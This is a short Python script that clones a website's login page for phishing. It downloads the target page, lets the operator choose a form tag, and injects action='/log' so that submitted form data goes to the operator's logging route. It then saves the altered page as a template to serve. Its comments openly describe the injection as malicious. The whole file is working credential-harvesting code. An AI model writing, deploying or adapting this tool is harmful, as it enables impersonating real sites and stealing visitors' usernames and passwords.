import requests

def main():
  url = input("Website to clone (include protocol & route): ")
  prepared = requests.Request('GET', url).prepare()
  content = requests.Session().send(prepared).text

  # Finding all lines in the source that contain as substring "<form",
  # these kind of lines are candidates for the actual login form.
  forms = []
  for line in content.split("\n"):
    if "<form" in line:
      forms.append(line)

  # The user chooses & verifies the actual login form tag in the source.
  print(f"Found {len(forms)} form actions:")
  for i,j in enumerate(forms):
    print('[' + str(i+1) + ']', j)

  # Adding at the very start of the form declaration tag, the malicious action to log form data.
  # If another action to this specific form was made, it will be overriden! 
  choiceIndex = int(input("Select a form to inject (numbered): ")) - 1
  injectedForm = forms[choiceIndex].replace("<form", "<form action=\"/log\"")
  content = content.replace(forms[choiceIndex], injectedForm)

  # writing the injected html to templates/output.html
  with open("templates/output.html", "w+", encoding="utf-8") as f:
    f.write(content)
    f.close()

if __name__ == "__main__":
  main()
